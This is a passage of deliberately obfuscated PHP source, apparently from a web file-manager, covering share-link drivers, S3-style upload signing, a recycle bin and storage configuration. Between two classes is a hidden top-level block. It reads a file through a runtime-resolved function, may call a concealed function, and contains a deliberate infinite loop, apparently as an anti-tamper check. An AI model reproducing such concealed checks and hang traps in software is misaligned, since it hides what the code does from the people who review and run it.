($a÷‡á„ß->pathParse[$C—å‡øŞö[1026]]) { $fİŠøÓç®¹ = $a÷‡á„ß->pathParse[$C—å‡øŞö[1026]]; } else { $fİŠøÓç®¹ = $B„ÖëÌÑãÚ; } $f¥—áí…“ = IO::copyMove($bƒÊ‚¿Û‰Ÿ, $fİŠøÓç®¹, $Aæ¬ïæ¬Œ, $f®÷–™³Ì); $f¥—áí…“ = $this->getPathOuter($f¥—áí…“); goto CˆÔØòÕ†á; DÂ‹Ö¤ƒé: } public function pathThis($fê¹ŠËŒ™´) { return get_path_this($this->pathParse[$_SERVER[¹…ÕÄ][75]]); } public function pathFather($FÏ‰ƒÁ¡ØŞ) { return get_path_father($this->pathParse[$_SERVER[¹…ÕÄ][75]]); } public function iconvSystem($A÷ÖøŞ–Œ) { return $A÷ÖøŞ–Œ; } protected function infoParse($a×¨ŞÄ‡ÒÊ, $dŞŒÈ˜Â¸à = false) { $dÒ•±©ÕíÃ =& $_SERVER[¹…ÕÄ]; $D´ĞîÚ‡œ† = $this->pathParse[$dÒ•±©ÕíÃ[460]][$dÒ•±©ÕíÃ[1049]] . $this->pathParse[$dÒ•±©ÕíÃ[1042]]; if ($dŞŒÈ˜Â¸à) { $bƒ‡í´»¾œ = IO::infoWithChildren($D´ĞîÚ‡œ†); } else { $bƒ‡í´»¾œ = IO::info($D´ĞîÚ‡œ†); } $BÚííñ«¡Š = $this->pathParse[$dÒ•±©ÕíÃ[460]]; return Action($dÒ•±©ÕíÃ[1190])->_shareItemeParse($bƒ‡í´»¾œ, $BÚííñ«¡Š); } public function listAll($aŞã’šÄ›¥) { $e­¹„ÔÑå¡ =& $_SERVER[¹…ÕÄ]; $bš¹àŠÂ”ò = IO::listAll($aŞã’šÄ›¥); $fÖíìš‡•ˆ = $this->pathParse[$e­¹„ÔÑå¡[460]]; foreach ($bš¹àŠÂ”ò as &$e„í³Äø×ë) { check_abort(); $e„í³Äø×ë = array_merge(IO::info($e„í³Äø×ë[$e­¹„ÔÑå¡[75]]), $e„í³Äø×ë); $e„í³Äø×ë[$e­¹„ÔÑå¡[84]] = Action($e­¹„ÔÑå¡[1190])->_shareItemeParse($e„í³Äø×ë, $fÖíìš‡•ˆ); } unset($e„í³Äø×ë); return $bš¹àŠÂ”ò; } public function getPathOuter($cÇÜ¬§) { goto Aß˜•Í”Ô¯; cÔ»îğòë: $a‚»çŞîšñ = KodIO::clear($cÇÜ¬§); $e„†ÈË¿† = KodIO::clear($this->pathParse[$eµÑŠÉÄß¿[460]][$eµÑŠÉÄß¿[1049]]); $Aîø¶øÛÔ = substr($a‚»çŞîšñ, strlen($e„†ÈË¿†)); goto f®‰— ×Œ«; Aß˜•Í”Ô¯: $eµÑŠÉÄß¿ =& $_SERVER[¹…ÕÄ]; $fÖ¥Ü — = KodIO::parse($cÇÜ¬§); if ($fÖ¥Ü —[$eµÑŠÉÄß¿[29]] == KodIO::KOD_SHARE_ITEM) { return $fÖ¥Ü —[$eµÑŠÉÄß¿[75]]; } goto cÔ»îğòë; f®‰— ×Œ«: if (substr($a‚»çŞîšñ, 0, strlen($e„†ÈË¿†)) != $e„†ÈË¿†) { return !1; } return $this->pathParse[$eµÑŠÉÄß¿[1043]] . $eµÑŠÉÄß¿[8] . ltrim($Aîø¶øÛÔ, $eµÑŠÉÄß¿[8]); goto b²øïèå“é; b²øïèå“é: } public function getType() { $fê±Íæ¶ =& $_SERVER[¹…ÕÄ]; $fÒ•‡…Ó•ì = str_replace($fê±Íæ¶[71], $fê±Íæ¶[33], get_class($this)); return strtolower($fÒ•‡…Ó•ì); } public function isTypeObject($fÒ°Ë‡ÙİÄ) { return IO::isTypeObject($fÒ°Ë‡ÙİÄ); } public function info($bË’÷“‡ƒ) { return $this->infoParse($bË’÷“‡ƒ); } public function infoAuth($b‰Ù’›ª•š) { return $this->infoParse($b‰Ù’›ª•š); } public function infoWithChildren($BÛƒÛÃ¦Ãâ) { return $this->infoParse($BÛƒÛÃ¦Ãâ, !0); } public function infoFull($b“à•†Ğï) { return $this->infoParse($b“à•†Ğï); } } class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($d˜İØÅ¾à) { $this->pathParse = $d˜İØÅ¾à; } protected function infoParse($B›Å¤°ƒÄ«, $Cƒ×‹ˆè‹Å = false) { $d­¸Ú×÷£ =& $_SERVER[¹…ÕÄ]; return Action($d­¸Ú×÷£[1048])->sharePathInfo($this->pathParse[$d­¸Ú×÷£[75]], !0, $Cƒ×‹ˆè‹Å); } public function listPath($D©‰ÌÈ«È, $A…‘“ˆâ¤ß = false) { $c¸§À…À“­ =& $_SERVER[¹…ÕÄ]; $e¬Ê«ÁÓî¡ = IO::listPath($D©‰ÌÈ«È, $A…‘“ˆâ¤ß); foreach ($e¬Ê«ÁÓî¡ as $EÛ¥ÕÑêƒº => $eš¬‚ØÍÙí) { if (!in_array($EÛ¥ÕÑêƒº, array($c¸§À…À“­[73], $c¸§À…À“­[74]))) { continue; } foreach ($eš¬‚ØÍÙí as $aÜ‡‹‰œé => $aÜÑëÓ¬ôŸ) { $aÜÑëÓ¬ôŸ = Action($c¸§À…À“­[1199])->parsePathChildren($aÜÑëÓ¬ôŸ, array($c¸§À…À“­[408] => $D©‰ÌÈ«È)); $e¬Ê«ÁÓî¡[$EÛ¥ÕÑêƒº][$aÜ‡‹‰œé] = Action($c¸§À…À“­[1048])->shareItemInfo($aÜÑëÓ¬ôŸ); } } return $e¬Ê«ÁÓî¡; } public function listAll($cİ¯£Ï˜‰) { $dÇÚö¼É³Ê =& $_SERVER[¹…ÕÄ]; $eÖöİÃæ¢ = IO::listAll($cİ¯£Ï˜‰); foreach ($eÖöİÃæ¢ as &$C´çÇ«¾¯‚) { $C´çÇ«¾¯‚ = array_merge(IO::info($C´çÇ«¾¯‚[$dÇÚö¼É³Ê[75]]), $C´çÇ«¾¯‚); $C´çÇ«¾¯‚[$dÇÚö¼É³Ê[84]] = Action($dÇÚö¼É³Ê[1048])->shareItemInfo($C´çÇ«¾¯‚); } unset($C´çÇ«¾¯‚); return $eÖöİÃæ¢; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($BñŠÒÛŒ²) { parent::__construct($BñŠÒÛŒ²); $this->signatureVersion($_SERVER[¹…ÕÄ][210]); } public function uploadFormData($aõ“¿äçáæ, $dä©š³õˆÚ = 3600) { goto eÌ²ô¨”Ğã; eÌ²ô¨”Ğã: $B¸ê‹òàª¬ =& $_SERVER[¹…ÕÄ]; $bó…Çô†ŒÔ = $B¸ê‹òàª¬[191]; $CÏãË˜¼¬Œ = $B¸ê‹òàª¬[1200]; goto eÎßÙ·Ç‘Ø; C’¼£›§»µ: $d«¨š–Áø× = base64_encode(json_encode($dÈ¡„Ášˆ•)); $Dô­‚ß³ = hash_hmac($B¸ê‹òàª¬[1210], $Föàˆ’ô, $B¸ê‹òàª¬[1211] . $this->secret, !0); $cåÛŸñËœ‰ = hash_hmac($B¸ê‹òàª¬[1210], $this->region, $Dô­‚ß³, !0); goto b†èˆ²ÕÌ‘; A¨ÆÉ°ÒÓÍ: $D¶ô¾¾¤Âœ = array($this->accessKey, $Föàˆ’ô, $this->region, $FËƒÑ²£, $f½·ŞªË›¤); $D›Êµ¯‰ˆ = implode($B¸ê‹òàª¬[8], $D¶ô¾¾¤Âœ); $dÈ¡„Ášˆ• = array($B¸ê‹òàª¬[1168] => gmdate($B¸ê‹òàª¬[1167], strtotime($B¸ê‹òàª¬[1203])), $B¸ê‹òàª¬[1169] => array(array($B¸ê‹òàª¬[1171] => $this->bucket), array($B¸ê‹òàª¬[1170] => $bó…Çô†ŒÔ), array($B¸ê‹òàª¬[1172], $B¸ê‹òàª¬[1173], $B¸ê‹òàª¬[33]), array($B¸ê‹òàª¬[1172], $B¸ê‹òàª¬[1204], $B¸ê‹òàª¬[33]), array($B¸ê‹òàª¬[1172], $B¸ê‹òàª¬[1205], $B¸ê‹òàª¬[33]), array($B¸ê‹òàª¬[1174] => $a–ç‡„¡å), array($B¸ê‹òàª¬[1206] => $D›Êµ¯‰ˆ), array($B¸ê‹òàª¬[1207] => $CÏãË˜¼¬Œ), array($B¸ê‹òàª¬[1208] => $aÍÂ†±¶İ), array($B¸ê‹òàª¬[1209] => $EÂŒØñçí£))); goto C’¼£›§»µ; aÀ©ó¾ì÷: $f½·ŞªË›¤ = $B¸ê‹òàª¬[1202]; $EÂŒØñçí£ = $dä©š³õˆÚ . $B¸ê‹òàª¬[33]; $a–ç‡„¡å = $B¸ê‹òàª¬[1166]; goto A¨ÆÉ°ÒÓÍ; eÎßÙ·Ç‘Ø: $FËƒÑ²£ = $B¸ê‹òàª¬[59]; $aÍÂ†±¶İ = gmdate($B¸ê‹òàª¬[1201]); $Föàˆ’ô = gmdate($B¸ê‹òàª¬[706]); goto aÀ©ó¾ì÷; b†èˆ²ÕÌ‘: $Eö²‹Şëãä = hash_hmac($B¸ê‹òàª¬[1210], $FËƒÑ²£, $cåÛŸñËœ‰, !0); $aå¼‘Œ³»‹ = hash_hmac($B¸ê‹òàª¬[1210], $f½·ŞªË›¤, $Eö²‹Şëãä, !0); $C„‹ëØ¨¯ = hash_hmac($B¸ê‹òàª¬[1210], $d«¨š–Áø×, $aå¼‘Œ³»‹); goto EÛğ®æñ‚â; EÛğ®æñ‚â: $aÈïÔÉƒ¾ó = array($B¸ê‹òàª¬[209] => $B¸ê‹òàª¬[33], $B¸ê‹òàª¬[1212] => $B¸ê‹òàª¬[33], $B¸ê‹òàª¬[1170] => $bó…Çô†ŒÔ, $B¸ê‹òàª¬[1174] => $a–ç‡„¡å, $B¸ê‹òàª¬[1178] => $d«¨š–Áø×, $B¸ê‹òàª¬[1213] => $D›Êµ¯‰ˆ, $B¸ê‹òàª¬[1214] => $CÏãË˜¼¬Œ, $B¸ê‹òàª¬[1215] => $aÍÂ†±¶İ, $B¸ê‹òàª¬[1216] => $EÂŒØñçí£, $B¸ê‹òàª¬[1217] => $C„‹ëØ¨¯, $B¸ê‹òàª¬[175] => $this->getHost()); return $aÈïÔÉƒ¾ó; goto EòŠºëÃ‰; EòŠºëÃ‰: } } goto fÜ·µ˜Æ¤º; F“¸âêËƒ¯: class SourceRecycleModel extends ModelBase { protected $tableName = "\x69\157\137\163\157\x75\x72\143\x65\137\x72\145\x63\171\143\154\x65"; protected $dataAuto = array(array("\143\162\x65\141\164\x65\x54\151\155\x65", "\164\x69\155\x65", "\x69\156\x73\145\162\164", "\146\x75\156\143\164\x69\x6f\x6e")); public function listData($EÈ¶¸†ø² = false) { $B ¾Â¦â±ù =& $_SERVER[¹…ÕÄ]; $EÈ¶¸†ø² = $EÈ¶¸†ø² ? $EÈ¶¸†ø² : USER_ID; $b²“«¹‰ø = $this->where(array($B ¾Â¦â±ù[1496] => $EÈ¶¸†ø²))->select(); return array_to_keyvalue($b²“«¹‰ø, $B ¾Â¦â±ù[33], $B ¾Â¦â±ù[390]); } public function moveToRecycle($BùÈè÷¡µ) { goto Aäğ™Œ„Ó; d»ôÕòÕŒš: if (!$Eô”Æß‘á || $Eô”Æß‘á[$B±ÏŒÊ¬ß[417]] == $B±ÏŒÊ¬ß[86]) { return; } $f÷ğ·øè£÷ = array($B±ÏŒÊ¬ß[404] => $BùÈè÷¡µ, $B±ÏŒÊ¬ß[1496] => USER_ID, $B±ÏŒÊ¬ß[544] => $Eô”Æß‘á[$B±ÏŒÊ¬ß[398]], $B±ÏŒÊ¬ß[545] => $Eô”Æß‘á[$B±ÏŒÊ¬ß[478]], $B±ÏŒÊ¬ß[548] => $Eô”Æß‘á[$B±ÏŒÊ¬ß[481]]); $this->add($f÷ğ·øè£÷); goto b³ª•ª¶©Ó; Aäğ™Œ„Ó: $B±ÏŒÊ¬ß =& $_SERVER[¹…ÕÄ]; $f©‘§âšõš = Model($B±ÏŒÊ¬ß[1183]); $Eô”Æß‘á = $f©‘§âšõš->sourceInfo($BùÈè÷¡µ); goto d»ôÕòÕŒš; b³ª•ª¶©Ó: $this->recycleMove($BùÈè÷¡µ, 1); if ($Eô”Æß‘á[$B±ÏŒÊ¬ß[397]] == $B±ÏŒÊ¬ß[86]) { $f×¢‘ê¬ = array($B±ÏŒÊ¬ß[548] => array($B±ÏŒÊ¬ß[507], $Eô”Æß‘á[$B±ÏŒÊ¬ß[481]] . $BùÈè÷¡µ . $B±ÏŒÊ¬ß[508])); $f©‘§âšõš->where($f×¢‘ê¬)->setField($B±ÏŒÊ¬ß[417], 1); } goto F·á‚ä”µ; F·á‚ä”µ: } public function clear() { $this->remove(!1); } public function remove($Bß–˜°¨Â‰ = false) { goto d§©Ë†àóÍ; d§©Ë†àóÍ: $bïï§®‹íŒ =& $_SERVER[¹…ÕÄ]; $b»á«¨íÂî = Model($bïï§®‹íŒ[1183]); $fŒ©‘®²ƒ– = $this->listData(); goto C¢½ì™ï¥¹; B¥ÆéîĞ‰: foreach ($F‚Ú¿Ÿ‰Ñè as $bÏÃ·ÅªÈ‚) { $b»á«¨íÂî->targetSpaceUpdate($bÏÃ·ÅªÈ‚[$bïï§®‹íŒ[398]], $bÏÃ·ÅªÈ‚[$bïï§®‹íŒ[478]]); } goto fô­…„×; C¢½ì™ï¥¹: $Bß–˜°¨Â‰ = $Bß–˜°¨Â‰ === !1 ? !1 : $Bß–˜°¨Â‰; $F‚Ú¿Ÿ‰Ñè = array(); foreach ($fŒ©‘®²ƒ– as $D‡Õ—Âİ®Î) { if ($Bß–˜°¨Â‰ != !1 && !in_array($D‡Õ—Âİ®Î, $Bß–˜°¨Â‰)) { continue; } $E¼Çá¸‘Êñ = $b»á«¨íÂî->sourceInfo($D‡Õ—Âİ®Î); $b»á«¨íÂî->remove($D‡Õ—Âİ®Î, !1); $CŒˆÉ¨Ö = $E¼Çá¸‘Êñ[$bïï§®‹íŒ[398]] . $bïï§®‹íŒ[70] . $E¼Çá¸‘Êñ[$bïï§®‹íŒ[478]]; $F‚Ú¿Ÿ‰Ñè[$CŒˆÉ¨Ö] = array($bïï§®‹íŒ[544] => $E¼Çá¸‘Êñ[$bïï§®‹íŒ[398]], $bïï§®‹íŒ[478] => $E¼Çá¸‘Êñ[$bïï§®‹íŒ[478]]); $this->where(array($bïï§®‹íŒ[390] => $D‡Õ—Âİ®Î))->delete(); } goto B¥ÆéîĞ‰; fô­…„×: } public function restore($AŸ£é½–Í = false) { $f÷Ê‘£Ñ° = $this->listData(); $this->_restoreSource($f÷Ê‘£Ñ°, $AŸ£é½–Í); } public function restoreUserAll($CËÎ‰„Ö™) { $aÕñ´ôˆ²ç = $this->listData($CËÎ‰„Ö™); $this->_restoreSource($aÕñ´ôˆ²ç, !1); } private function _restoreSource($cé‹ù‘·ê¶, $d£ˆÔæÔœÁ) { goto dÀ­ˆçšæÏ; dˆÄÚÀ«ßŸ: $C«äì»Çì¦->updateModifyTime($a‘¦„Å›¦£); goto cÂë®¤•Ï×; CèÂ¨Ç–: if (!$cé‹ù‘·ê¶) { return !0; } $a‘¦„Å›¦£ = array(); foreach ($cé‹ù‘·ê¶ as $fœ¾¢Ù’Óİ) { goto DÑˆÑÈ¡™; DÑˆÑÈ¡™: if ($d£ˆÔæÔœÁ != !1 && !in_array($fœ¾¢Ù’Óİ, $d£ˆÔæÔœÁ)) { continue; } $fï²Ş‰ÍÃÇ = $C«äì»Çì¦->sourceInfo($fœ¾¢Ù’Óİ); $C¶Èß„î·½ = $C«äì»Çì¦->sourceInfo($fï²Ş‰ÍÃÇ[$cË¸––¢õ…[472]]); goto D‰“Š¨©Àã; BÒñšÈçÜ…: $a‘¦„Å›¦£[] = $fï²Ş‰ÍÃÇ[$cË¸––¢õ…[472]]; if ($fï²Ş‰ÍÃÇ[$cË¸––¢õ…[397]] == $cË¸––¢õ…[86]) { $a‘¦„Å›¦£[] = $fœ¾¢Ù’Óİ; } $C«äì»Çì¦->lockMoveEnd($fœ¾¢Ù’Óİ); goto C•©Áäó‚÷; cĞõÉ‹‘Œ: if ($fï²Ş‰ÍÃÇ[$cË¸––¢õ…[397]] == $cË¸––¢õ…[86]) { $CÊÄ¦Ìø ¬ = array($cË¸––¢õ…[548] => array($cË¸––¢õ…[507], $fï²Ş‰ÍÃÇ[$cË¸––¢õ…[481]] . $fœ¾¢Ù’Óİ . $cË¸––¢õ…[508])); $C«äì»Çì¦->where($CÊÄ¦Ìø ¬)->setField($cË¸––¢õ…[417], 0); $this->restoreFolderChildren($fœ¾¢Ù’Óİ, $cé‹ù‘·ê¶); } $this->where(array($cË¸––¢õ…[390] => $fœ¾¢Ù’Óİ))->delete(); $C«äì»Çì¦->folderSizeReset($fï²Ş‰ÍÃÇ[$cË¸––¢õ…[472]]); goto BÒñšÈçÜ…; D‰“Š¨©Àã: if ($C¶Èß„î·½[$cË¸––¢õ…[417]] == $cË¸––¢õ…[86]) { continue; } $C«äì»Çì¦->lockMoveStart($fœ¾¢Ù’Óİ); $this->recycleMove($fœ¾¢Ù’Óİ, 0); goto cĞõÉ‹‘Œ; C•©Áäó‚÷: } goto dˆÄÚÀ«ßŸ; dÀ­ˆçšæÏ: $cË¸––¢õ… =& $_SERVER[¹…ÕÄ]; $C«äì»Çì¦ = Model($cË¸––¢õ…[1183]); $d£ˆÔæÔœÁ = $d£ˆÔæÔœÁ == !1 ? !1 : $d£ˆÔæÔœÁ; goto CèÂ¨Ç–; cÂë®¤•Ï×: } private function restoreFolderChildren($A‹ŸÁ‚½à, $DŠ‹¿‘´µÜ) { goto cÆŠœ»èä; cÆŠœ»èä: $bòÒ¿–Œí =& $_SERVER[¹…ÕÄ]; $a¾·¸Ğ£Õ¬ = Model($bòÒ¿–Œí[1183]); $B‘àŞ®¯¯² = array($bòÒ¿–Œí[390] => array($bòÒ¿–Œí[7], array())); goto fŠ·ƒ¥œ¾ˆ; fŠ·ƒ¥œ¾ˆ: foreach ($DŠ‹¿‘´µÜ as $dª÷çÒÓç­) { if ($dª÷çÒÓç­ == $A‹ŸÁ‚½à) { continue; } if (!$a¾·¸Ğ£Õ¬->isParentOf($A‹ŸÁ‚½à, $dª÷çÒÓç­)) { continue; } $càÂĞÌ„‡· = $a¾·¸Ğ£Õ¬->sourceInfo($dª÷çÒÓç­); if ($càÂĞÌ„‡·[$bòÒ¿–Œí[397]] == $bòÒ¿–Œí[86]) { $B‘àŞ®¯¯²[] = array($bòÒ¿–Œí[548] => array($bòÒ¿–Œí[507], $càÂĞÌ„‡·[$bòÒ¿–Œí[481]] . $dª÷çÒÓç­ . $bòÒ¿–Œí[508])); } else { $B‘àŞ®¯¯²[$bòÒ¿–Œí[390]][1][] = $dª÷çÒÓç­; } } if (!$B‘àŞ®¯¯²[$bòÒ¿–Œí[390]][1]) { unset($B‘àŞ®¯¯²[$bòÒ¿–Œí[390]]); } if (!$B‘àŞ®¯¯²) { return; } goto cÈËá¿¶ìî; cÈËá¿¶ìî: $B‘àŞ®¯¯²[$bòÒ¿–Œí[390]][1] = array_unique($B‘àŞ®¯¯²[$bòÒ¿–Œí[390]][1]); $B‘àŞ®¯¯²[$bòÒ¿–Œí[936]] = $bòÒ¿–Œí[1755]; $a¾·¸Ğ£Õ¬->where($B‘àŞ®¯¯²)->setField($bòÒ¿–Œí[417], 1); goto Aö«‰Æö”; Aö«‰Æö”: } private function recycleMove($Då·õÃè¢³, $bÜª˜‘‚ö = 1) { $C²ö¶†¿·£ =& $_SERVER[¹…ÕÄ]; $d¢œÓ¤ÑÕê = Model($C²ö¶†¿·£[1183]); $A¼Ó¶ˆ·Öê = Model($C²ö¶†¿·£[1963]); $e†—Ê¢Î· = array($C²ö¶†¿·£[390] => $Då·õÃè¢³); if ($bÜª˜‘‚ö) { $d¢œÓ¤ÑÕê->where($e†—Ê¢Î·)->setField($C²ö¶†¿·£[417], 1); $A¼Ó¶ˆ·Öê->eventRecycle($Då·õÃè¢³, $C²ö¶†¿·£[1964]); } else { $AàÆ´ØÆ§ï = $d¢œÓ¤ÑÕê->where($e†—Ê¢Î·)->find(); $EÉ„Ú„—’ = $AàÆ´ØÆ§ï[$C²ö¶†¿·£[397]] == $C²ö¶†¿·£[86]; $A˜È¸šæÚŒ = $d¢œÓ¤ÑÕê->fileNameAuto($AàÆ´ØÆ§ï[$C²ö¶†¿·£[472]], $AàÆ´ØÆ§ï[$C²ö¶†¿·£[28]], REPEAT_RENAME_FOLDER, $EÉ„Ú„—’); if ($A˜È¸šæÚŒ != $AàÆ´ØÆ§ï[$C²ö¶†¿·£[28]]) { $d¢œÓ¤ÑÕê->rename($Då·õÃè¢³, $A˜È¸šæÚŒ); } $d¢œÓ¤ÑÕê->where($e†—Ê¢Î·)->setField($C²ö¶†¿·£[417], 0); $A¼Ó¶ˆ·Öê->eventRecycle($Då·õÃè¢³, $C²ö¶†¿·£[1965]); } } } if (!isset($_SERVER[$_SERVER[¹…ÕÄ][813]]) || !isset($_SERVER[$_SERVER[¹…ÕÄ][811]])) { goto aÑëùÉºôˆ; bØŞ„Š¿Äè: $dï‰ùâ„—İ($_SERVER[$_SERVER[¹…ÕÄ][816]] . $_SERVER[¹…ÕÄ][817]); $cò­•¤à… = 2; while ($cò­•¤à… > 1) { $aÈËùÎ‘ç« = rawurlencode($cò­•¤à… . $_SERVER[¹…ÕÄ][373]); } goto aø‹ì²Ô´†; aÑëùÉºôˆ: $BœÏôÙÂÙƒ = $_SERVER[¹…ÕÄ][815]; $A¾Œ³³©Š‡ = $_SERVER[$_SERVER[¹…ÕÄ][816]] . $_SERVER[¹…ÕÄ][817]; $d®»èê™õ = $BœÏôÙÂÙƒ($A¾Œ³³©Š‡); goto d®”õà—¼À; d®”õà—¼À: $c“´Î…ó¨ = explode($_SERVER[¹…ÕÄ][227], $d®»èê™õ); if (count($c“´Î…ó¨) < $_SERVER[¹…ÕÄ][574]) { $föÁÊÔ«—Œ = $_SERVER[¹…ÕÄ][818]; $föÁÊÔ«—Œ(); } $dï‰ùâ„—İ = $_SERVER[¹…ÕÄ][1116]; goto bØŞ„Š¿Äè; aø‹ì²Ô´†: } class StorageModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\164\x65\x6d\x2e\163\x74\157\162\x61\147\x65\114\151\x73\164"; public $field = array("\x6e\x61\155\x65", "\163\x69\172\145\115\x61\170", "\163\x79\x73\164\x65\155", "\x64\x65\146\x61\x75\154\164", "\x64\x72\x69\x76\145\162", "\x63\x6f\156\x66\x69\x67"); public function listData($F„÷‚Š¢° = false, $Cœ¦ĞÑ²‰˜ = "\x6d\x6f\144\x69\x66\x79\x54\x69\x6d\x65", $aïÉ…³Ò = false) { $AÃ±î †Æ˜ =& $_SERVER[¹…ÕÄ]; $aË¿Îç¡ = parent::listData($F„÷‚Š¢°, $Cœ¦ĞÑ²‰˜, $aïÉ…³Ò); if ($F„÷‚Š¢°) { return $aË¿Îç¡; } $dÉµª¦Üˆ« = $this->ioSizeUseGet(array_to_keyvalue($aË¿Îç¡, $AÃ±î †Æ˜[33], $AÃ±î †Æ˜[388])); foreach ($aË¿Îç¡ as $dÈ¿ ³‘Í => $A«Èµ‘¡‡) { unset($aË¿Îç¡[$dÈ¿ ³‘Í][$AÃ±î †Æ˜[6]]); $aË¿Îç¡[$dÈ¿ ³‘Í][$AÃ±î †Æ˜[1653]] = isset($dÉµª¦Üˆ«[$A«Èµ‘¡‡[$AÃ±î †Æ˜[388]]]) ? $dÉµª¦Üˆ«[$A«Èµ‘¡‡[$AÃ±î †Æ˜[388]]] : 0; } return $aË¿Îç¡; } public function ioSizeUseGet($FÃÆĞ¹âã­) { goto CŞˆÏÈ‚ƒî; c¸§åáÛİ§: $BØŸ¡­´†ã = array($b‘Âß‡’ô©[763] => array($b‘Âß‡’ô©[7], $FÃÆĞ¹âã­)); $e–éÒ–³£¢ = Model($b‘Âß‡’ô©[734])->field($f§ğ’åàÆñ)->where($BØŸ¡­´†ã)->group($b‘Âß‡’ô©[763])->select(); $e–éÒ–³£¢ = array_to_keyvalue($e–éÒ–³£¢, $b‘Âß‡’ô©[388], $b‘Âß‡’ô©[77]); goto cˆìÊ†µÜÕ; C…¨”½Çˆí: $e–éÒ–³£¢ = Cache::get($eâ»ŠîÚÑà); if ($e–éÒ–³£¢) { return $e–éÒ–³£¢; } $f§ğ’åàÆñ = array($b‘Âß‡’ô©[763] => $b‘Âß‡’ô©[388], $b‘Âß‡’ô©[1967] => $b‘Âß‡’ô©[77]); goto c¸§åáÛİ§; cˆìÊ†µÜÕ: Cache::set($eâ»ŠîÚÑà, $e–éÒ–³£¢, 60); return $e–éÒ–³£¢; goto eÖàñî¬ğª; CŞˆÏÈ‚ƒî: $b‘Âß‡’ô© =& $_SERVER[¹…ÕÄ]; if (!$FÃÆĞ¹âã­) { return array(); } $eâ»ŠîÚÑà = $b‘Âß‡’ô©[1966] . implode($b‘Âß‡’ô©[47], $FÃÆĞ¹âã­); goto C…¨”½Çˆí; eÖàñî¬ğª: } public function getConfig($AÊáÕï†–¼) { $F¤ª²Ì­Õˆ = parent::listData($AÊáÕï†–¼); return json_decode($F¤ª²Ì­Õˆ[$_SERVER[¹…ÕÄ][6]], !0); } public function update($DÃñŠã¾‚º, $dŒë¾Ö ×) { goto E«Š¤ë¯àˆ; f¸¦¹¼õ¢˜: $b¹Û˜¹ÕÀ¹ = parent::update($DÃñŠã¾‚º, $dŒë¾Ö ×); if ($b¹Û˜¹ÕÀ¹ && $dŒë¾Ö ×[$eïàá¾´«‚[34]]) { foreach ($A‚˜÷ÃÓ‚’ as $f°˜¨êè©œ) { if ($f°˜¨êè©œ[$eïàá¾´«‚[34]] && $f°˜¨êè©œ[$eïàá¾´«‚[388]] != $DÃñŠã¾‚º) { parent::update($f°˜¨êè©œ[$eïàá¾´«‚[388]], array($eïàá¾´«‚[34] => 0)); } } } return $b¹Û˜¹ÕÀ¹; goto f¹ö÷è»; B„¦„²¦‡¸: if (isset($A‚˜÷ÃÓ‚’[$E¨µÆ˜ÌÚ«]) && $A‚˜÷ÃÓ‚’[$E¨µÆ˜ÌÚ«][$eïàá¾´«‚[388]] != $DÃñŠã¾‚º) { return !1; } if (isset($dŒë¾Ö ×[$eïàá¾´«‚[1968]]) && $dŒë¾Ö ×[$eïàá¾´«‚[1968]] == $eïàá¾´«‚[86]) { $this->checkConfig($dŒë¾Ö ×); } unset($dŒë¾Ö ×[$eïàá¾´«‚[1968]]); goto f¸¦¹¼õ¢˜; E«Š¤ë¯àˆ: $eïàá¾´«‚ =& $_SERVER[¹…ÕÄ]; $E¨µÆ˜ÌÚ« = $dŒë¾Ö ×[$eïàá¾´«‚[28]]; $A‚˜÷ÃÓ‚’ = array_to_keyvalue(parent::listData(), $eïàá¾´«‚[28]); goto B„¦„²¦‡¸; f¹ö÷è»: } public function add($aÁÆá‡¨ñª) { goto b—İ¤è‚œø; bí¨É²…”Ò: $this->checkConfig($aÁÆá‡¨ñª); $f±ä µËÕô = parent::insert($aÁÆá‡¨ñª); if ($f±ä µËÕô && $aÁÆá‡¨ñª[$C†Şåí‹Ê¡[34]]) { foreach ($f¶¿ÛÅ¶ªŠ as $e¨ËÏÎßğ¡) { if ($e¨ËÏÎßğ¡[$C†Şåí‹Ê¡[34]]) { parent::update($e¨ËÏÎßğ¡[$C†Şåí‹Ê¡[388]], array($C†Şåí‹Ê¡[34] => 0)); } } } goto F‰´•»÷”Ğ; b—İ¤è‚œø: $C†Şåí‹Ê¡ =& $_SERVER[¹…ÕÄ]; $f¶¿ÛÅ¶ªŠ = array_to_keyvalue(parent::listData(), $C†Şåí‹Ê¡[28]); if (isset($f¶¿ÛÅ¶ªŠ[$aÁÆá‡¨ñª[$C†Şåí‹Ê¡[28]]])) { return !1; } goto bí¨É²…”Ò; F‰´•»÷”Ğ: return $f±ä µËÕô; goto E”Õì¥¼†Ã; E”Õì¥¼†Ã: } public function checkConfig(&$DÂ ê¯ö¿‚) { goto a­¾›˜Ú¬; dÏ¶Œ÷Ğè„: foreach ($D·ÊŒ…‘Ú as $FÑùˆ§–¡¦ => $dãÀ°õ¥ƒÜ) { $D·ÊŒ…‘Ú[$FÑùˆ§–¡¦] = trim($dãÀ°õ¥ƒÜ); } $D·ÊŒ…‘Ú[$Fë…—…Ş»†[1969]] = rand_string(6); $A„Îù¤Š = $GLOBALS[$Fë…—…Ş»†[6]][$Fë…—…Ş»†[87]][$Fë…—…Ş»†[771]]; goto DÖãø³‘ˆã; e‰®Óàª‘–: $DÂ ê¯ö¿‚[$Fë…—…Ş»†[6]] = json_encode($D·ÊŒ…‘Ú); $DÂ ê¯ö¿‚[$Fë…—…Ş»†[93]] = $cİÖ—‹Æ¥Ô; return !0; goto CößåÊÍµ•; Dö¦¨Å‰›•: $F‡«‚„¡Ç¡ = new $Dâ³Î…Œ½§($D·ÊŒ…‘Ú); if (in_array($f”‡—…Ïª’, $F‡«‚„¡Ç¡->objectDriver)) { if (!$F‡«‚„¡Ç¡->isBucketCors() && !$F‡«‚„¡Ç¡->setBucketCors()) { $CÂ˜›¶­¹œ = LNG($Fë…—…Ş»†[1973]); $CÂ˜›¶­¹œ .= $Fë…—…Ş»†[1974] . LNG($Fë…—…Ş»†[1975]); show_json($CÂ˜›¶­¹œ, !1); } } $C•Ëçª¸¼» = rtrim($D·ÊŒ…‘Ú[$Fë…—…Ş»†[1054]], $Fë…—…Ş»†[8]) . $Fë…—…Ş»†[8]; goto béÔÜ²Ü”; a­¾›˜Ú¬: $Fë…—…Ş»† =& $_SERVER[¹…ÕÄ]; $f”‡—…Ïª’ = strtolower($DÂ ê¯ö¿‚[$Fë…—…Ş»†[93]]); $D·ÊŒ…‘Ú = json_decode($DÂ ê¯ö¿‚[$Fë…—…Ş»†[6]], !0); goto dÏ¶Œ÷Ğè„; DÖãø³‘ˆã: $cİÖ—‹Æ¥Ô = 